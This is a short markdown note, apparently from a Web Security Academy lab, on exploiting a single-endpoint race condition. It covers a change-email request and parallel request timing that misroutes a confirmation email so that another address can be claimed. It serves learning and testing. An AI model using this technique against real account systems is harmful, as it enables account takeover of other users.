# Payload 04 – Single-Endpoint Race

## Target

```http
POST /my-account/change-email
```

---

## Normal Request

```http
POST /my-account/change-email HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@exploit-server.net
```

---

## Test Values

Use different email addresses when benchmarking:

```text
test1@exploit-server.net
test2@exploit-server.net
test3@exploit-server.net
test4@exploit-server.net
```

---

## Sequential Test

```text
Request 1 → test1@
Request 2 → test2@
Request 3 → test3@
```

The latest pending email normally replaces the previous one.

---

## Parallel Test

```text
Request 1 ─┐
Request 2 ─┤
Request 3 ─┤──→ /change-email
Request 4 ─┘
```

Look for confirmation emails where:

```text
Recipient ≠ submitted email
```

This indicates a race between starting the email task and retrieving the pending email from storage. :contentReference[oaicite:6]{index=6}

---

## Lab Target

The intended target email is:

```text
carlos@ginandjuice.shop
```

---

## Attack Concept

```text
Request A
email=attacker@exploit-server
       ↓
starts email task

             RACE WINDOW

Request B
email=carlos@ginandjuice.shop
       ↓
changes stored state

             ↓

Email task retrieves current state
             ↓
Wrong confirmation email
```

---

## Key Indicator

Confirmation email body contains:

```text
carlos@ginandjuice.shop
```

when the request that generated the task used a different address.